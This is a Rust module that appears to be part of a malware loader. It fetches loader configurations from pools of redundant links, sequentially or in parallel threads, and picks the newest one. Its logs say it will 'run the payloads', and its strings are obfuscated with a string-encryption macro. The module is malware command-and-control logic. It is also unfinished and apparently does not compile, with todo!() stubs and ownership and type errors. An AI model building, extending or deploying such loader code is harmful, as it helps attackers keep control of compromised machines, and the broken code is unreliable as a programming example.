use crate::link::Link;
use crate::link::LinkFetch;
use log::info;
use log::warn;
use log::debug;
use serde::{Deserialize, Serialize};

use crate::config::Config;
use cryptify::encrypt_string;

use anyhow::bail;
use std::thread;

use rand::seq::SliceRandom;


#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub struct Advanced {
    pub random:u64,             // fetch only x random link from pool and ignore the other, (0 not set)
    pub max_link_broken:u64,    // how many accepted link broken before switch to next pool if no conf found, (0 not set)
    pub parallel:bool,          // try to fetch every link in the same time, if not its one by one
    pub linear:bool,            // fetch link in the order or randomized
    pub stop_same:bool,         // stop if found the same conf -> not for parallel_fetch
    pub stop_new:bool,          // stop if found a new conf -> not for parallel_fetch
}



#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub enum PoolMode {
    SIMPLE,
    ADVANCED(Advanced),
}
//TODO il faut ajouter aussi des modes de choix, pourcentage de liens valides etc...
//TODO,il faudra rajouter la date de création dans la config pour comparer si plusieurs conf différentes trouvées dans un pool

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub struct PoolLinks {
    pub pool_links: Vec<Link>,
    pub pool_mode: PoolMode,
}

impl PoolLinks {
    pub fn update_pool(&self, config: &Config) -> Result<Config, anyhow::Error> {
        match &self.pool_mode {
            PoolMode::SIMPLE => self.update_links_simple(config),
            PoolMode::ADVANCED(advanced) => self.update_links_advanced(config,advanced),
        }
    }

    //TODO update with date check and remove DECISION message, only print the config number if needed.
    pub fn update_links_simple(&self, config: &Config) -> Result<Config, anyhow::Error> {
        let mut link_nb: i32 = 0;
        for link in &self.pool_links {
            link_nb = link_nb + 1;
            info!(
                "{}/{}{}{:?}",
                link_nb,
                &self.pool_links.len(),
                encrypt_string!(" Link: "),
                &link.get_target()
            );

            let newconf: Config = match link.fetch_config(&config) {
                Ok(newconf) => newconf,
                Err(error) => {
                    warn!("{}{}", encrypt_string!("error: "), error);
                    continue;
                }
            };
            //nex time its here

            if config.is_same_loader(&newconf) {
                info!("{}", encrypt_string!("same config: Yes"));
                //remove
                info!(
                    "{}",
                    encrypt_string!(
                        "[+] DECISION: keep the same active LOADER, and run the payloads"
                    )
                );
                //TODO verif cette ligne était fausse je pense:
                //bail!("{}", encrypt_string!("Found same loader"))
                return Ok(newconf);
            }
            warn!("{}", encrypt_string!("same config: No"));
            info!(
                "{}",
                encrypt_string!(
                    "[+] DECISION: replace the active LOADER by this one, and run the payloads"
                )
            );
            return Ok(newconf);
        }
        bail!("{}", encrypt_string!("No VALID config found in Pool"))
    }

    /*
    pub struct Advanced {
    pub random:u64,             // fetch only x random link from pool and ignore the other, (0 not set)
    pub max_link_broken:u64,    // how many accepted link broken before switch to next pool if no conf found, (0 not set)
    pub parallel:bool,          // try to fetch every link in the same time, if not its one by one
    pub linear:bool,            // fetch link in the order or randomized
    pub stop_same:bool,         // stop if found the same conf -> not for parallel_fetch
    pub stop_new:bool,          // stop if found a new conf -> not for parallel_fetch
}
 */

    pub fn update_links_advanced(&self, config: &Config, advanced: &Advanced) -> Result<Config, anyhow::Error> {
        let mut fetch_configs: Vec<(Config,i32)> = vec![];
        //let pool_link: Vec<&Link>;
        let pool_link: Vec<Link>;


        if advanced.random != 0 {
            // TODO add advanced.random and remove 3 and test if advance.random < size -> not tested
            //let sample: Vec<_> = self.pool_links
            let sample: Vec<Link> = self.pool_links
            .choose_multiple(&mut rand::thread_rng(), 3)
            .collect();
            println!("{:?}",sample);
            pool_link=sample;
            //pool_link  // TODO random
        }else if advanced.linear {
            pool_link= self.pool_links;
        }else{
            todo!() 
            //pool_link=todo!() // TODO not linear -> randomized order, on devrait ptet renommer comme ça.
        }

        let pool_link_len= pool_link.len();

        //TODO: only if parallel...
        let mut handle_list: Vec<thread::JoinHandle<(Config,i32)>> = vec![];
        let mut link_nb: i32 = 0;

        if advanced.parallel {
            info!("[+] fetch all link in parallel")
        }else{
            info!("[+] fetch all link one by one")
        }

        for link in pool_link {
            link_nb = link_nb + 1;
            info!(
                "{}/{}{}{:?}",
                link_nb,
                &pool_link_len,
                encrypt_string!(" Link: "),
                &link.get_target()
            );

            if advanced.parallel{
                
                let thread_link=link.clone();
                let thread_config=config.clone();
                let handle: thread::JoinHandle<(Config,i32)> = thread::spawn(move || {
                    debug!("thread begin, link: {}",link_nb);
                    //TODO pas de unwrap ici, faire un jolie message de crash
                    let newconfig= thread_link.fetch_config(&thread_config).unwrap();
                    debug!("thread end, link: {}",link_nb);
                    (newconfig,link_nb)
                });
                handle_list.push(handle);
    
            }else{
                // TODO deal with stop_same and stop_new (avec des return)
                todo!()
            }
        }


        if advanced.parallel {
            info!("[+] all thread run, wait  join");

            for handle in handle_list {
                //TODO ptet ici pas de unwrap oupsi.
                match handle.join() {
                    Ok(conf_int) => fetch_configs.push(conf_int),
                    Err(error) => warn!("{}{:?}", encrypt_string!("Thread link fail to fetch: "), error)
                    } ;
                
            }
    
        }

        // ici: config_list est OK
        
        //TODO max_link_broken -> en fonction de la taille de config_list, ca donne combien de lien broken ?
        // pour ca il faudrait checker pool_link_len 

        self.choose_config_from_config_list(config,advanced,fetch_configs)
    }

    pub fn choose_config_from_config_list(&self, config: &Config, _advanced: &Advanced, config_list:Vec<(Config,i32)> ) -> Result<Config, anyhow::Error> {

        if config_list.len() == 0 {
            bail!("{}", encrypt_string!("No VALID config found in Pool: empty list"))
        }
        let mut config_choosen : Config= config_list[0].0.clone();
        let mut nb_choosen : i32 = config_list[0].1.clone();
            
        for (conf,i) in config_list{
            if config_choosen.date <= conf.date {
                if conf.is_same_loader(&config_choosen){
                    debug!("Config nb {} is equal to {}",nb_choosen,i)
                }else{
                config_choosen = conf;
                nb_choosen=i;
                }
            }
        };

        if config.date <= config_choosen.date {
            info!(
                "{}{}",
                encrypt_string!(
                    "[+] choose CONFIG fetch from link: "
                ),
                nb_choosen
            );        
Ok(config_choosen)
        } else {
            bail!("{}", encrypt_string!("No VALID config found in Pool: running config.date is superior to all config"))
        }
    }


    // doc: https://nickymeuleman.netlify.app/blog/multithreading-rust
    /* 
    pub fn update_links_advanced(&self, config: &Config) -> Result<Config, anyhow::Error> {
        let mut handle_list: Vec<thread::JoinHandle<Config>> = vec![];
        let pool_link= &self.pool_links;
        let pool_link_len= pool_link.len();

        let mut link_nb: i32 = 0;
        for link in pool_link {
            link_nb = link_nb + 1;
            info!(
                "{}/{}{}{:?}",
                link_nb,
                &pool_link_len,
                encrypt_string!(" Link: "),
                &link.get_target()
            );
            let thread_link=link.clone();
            let thread_config=config.clone();
            let handle: thread::JoinHandle<Config> = thread::spawn(move || {
                info!("thread begin {}",link_nb);
                //TODO pas de unwrap ici, faire un jolie message de crash
                let newconfig= thread_link.fetch_config(&thread_config).unwrap();
                info!("thread end {}",link_nb);
                newconfig
            });
            handle_list.push(handle);

        }
        info!("all thread run, wait to join");
        //let mut handle_nb: i32 = 0;

        let mut config_list: Vec<Config> = vec![];
        for handle in handle_list {
            //TODO ptet ici pas de unwrap oupsi.
            let newconfig= handle.join().unwrap();
            config_list.push(newconfig);
        }

        // TODO choice de la conf la plus recente PARMIS les NOUVELLES conf. si la conf du loader est plus recente. elle compte pas. (mais très probablement va se faire ecraser au prochain RELOAD) -> quuuoique.
        // ok la conf la plus récente bas les couilles.
        // si que des confs identique, on les renvoit., si la conf du loader est plus recente que les autres configs, on 
        for conf in config_list{
            info!("VICTORY! {:?}",conf);
        }
        info!("CRASH now");
        todo!()
    }
    */
}

//use std::time::Duration;
